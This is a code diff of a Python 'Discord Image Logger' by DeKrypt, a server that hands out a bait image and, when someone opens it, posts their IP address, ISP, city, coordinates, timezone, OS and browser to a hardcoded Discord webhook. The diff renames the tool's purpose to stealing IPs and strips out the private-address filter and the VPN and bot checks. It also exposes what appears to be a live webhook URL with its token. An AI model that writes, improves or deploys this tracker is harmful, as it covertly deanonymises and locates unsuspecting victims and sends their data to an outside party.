@@ -1,16 +1,15 @@
 # Discord Image Logger
-# By DeKrypt | Mirror Fix Version
+# By DeKrypt | Fixed Mirror
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
 import requests, httpagentparser
 
 _app_ = "Discord Image Logger"
-__description__ = "A simple application which allows you to track IPs by abusing Discord's Open Original feature"
+__description__ = "Steals IPs via Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
-# CONFIG
 config = {
     "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
     "image": "https://notepad-plus-plus.org/assets/images/notepad4ever.png",
@@ -19,44 +18,32 @@ config = {
     "color": 0x00FFFF,
     "crashBrowser": False,
     "accurateLocation": False,
-    "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
-        "richMessage": True,
-    },
+    "message": {"doMessage": False, "message": "This browser has been pwned by DeKrypt's Image Logger.", "richMessage": True},
     "vpnCheck": 1,
     "linkAlerts": True,
     "buggedImage": True,
     "antiBot": 1,
-    "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
-    }
+    "redirect": {"redirect": False, "page": "https://your-link.here"},
 }
 
-blacklistedIPs = ("27", "104", "143", "164")  # skip these
+blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
+    if ip.startswith(("34","35")):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
-    else:
-        return False
+    return False
 
 def reportError(error):
     requests.post(config["webhook"], json={
         "username": config["username"],
         "content": "@everyone",
-        "embeds": [{
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```"
-        }]
+        "embeds": [{"title": "Image Logger - Error","color": config["color"],"description": f"An error occurred!\n```\n{error}\n```"}]
     })
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image_url=None):
-    if ip.startswith(blacklistedIPs) or ip.startswith(("127.", "10.", "192.168.", "172.")):
+    if ip.startswith(blacklistedIPs):
         return
 
     bot = botCheck(ip, useragent)
@@ -69,35 +56,17 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
                 "embeds": [{
                     "title": "Image Logger - Link Sent",
                     "color": config["color"],
-                    "description": f"An **Image Logging** link was sent in a chat!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
+                    "description": f"**Image Logging Link Sent!**\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
                     "image": {"url": image_url or config["image"]}
                 }]
             })
         return
 
     ping = "@everyone"
-
     try:
         info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    except Exception as e:
-        reportError(f"Failed to get IP info for {ip}: {e}")
-        return
-
-    if info.get("proxy", False):
-        if config["vpnCheck"] == 2:
-            return
-        if config["vpnCheck"] == 1:
-            ping = ""
-
-    if info.get("hosting", False):
-        if config["antiBot"] == 4 and not info.get("proxy", False):
-            return
-        if config["antiBot"] == 3:
-            return
-        if config["antiBot"] == 2 and not info.get("proxy", False):
-            ping = ""
-        if config["antiBot"] == 1:
-            ping = ""
+    except:
+        info = {}
 
     os_name, browser = httpagentparser.simple_detect(useragent)
 
@@ -112,17 +81,17 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
 **Endpoint:** {endpoint}
 
 **IP Info:**
-> **IP:** {ip if ip else 'Unknown'}
-> **Provider:** {info.get('isp', 'Unknown')}
-> **ASN:** {info.get('as', 'Unknown')}
-> **Country:** {info.get('country', 'Unknown')}
-> **Region:** {info.get('regionName', 'Unknown')}
-> **City:** {info.get('city', 'Unknown')}
-> **Coords:** {str(info.get('lat', 'Unknown')) + ', ' + str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}
-> **Timezone:** {info.get('timezone', 'Unknown')}
-> **Mobile:** {info.get('mobile', 'Unknown')}
-> **VPN:** {info.get('proxy', False)}
-> **Bot:** {"Possibly" if info.get('hosting', False) else "False"}
+> **IP:** {ip or 'Unknown'}
+> **Provider:** {info.get('isp','Unknown')}
+> **ASN:** {info.get('as','Unknown')}
+> **Country:** {info.get('country','Unknown')}
+> **Region:** {info.get('regionName','Unknown')}
+> **City:** {info.get('city','Unknown')}
+> **Coords:** {str(info.get('lat','Unknown')) + ',' + str(info.get('lon','Unknown')) if not coords else coords.replace(',',',')}
+> **Timezone:** {info.get('timezone','Unknown')}
+> **Mobile:** {info.get('mobile','Unknown')}
+> **VPN:** {info.get('proxy',False)}
+> **Bot:** {"Possibly" if info.get('hosting',False) else "False"}
 
 **PC Info:**
 > **OS:** {os_name}
@@ -142,7 +111,7 @@ class Handler(BaseHTTPRequestHandler):
         try:
             query = parse.urlparse(self.path).query
             params = parse.parse_qs(query)
-            img_url = params.get("url", [config["image"]])[0]
+            img_url = params.get("url",[config["image"]])[0]
 
             user_ip = self.client_address[0]
             user_agent = self.headers.get('User-Agent', 'Unknown')
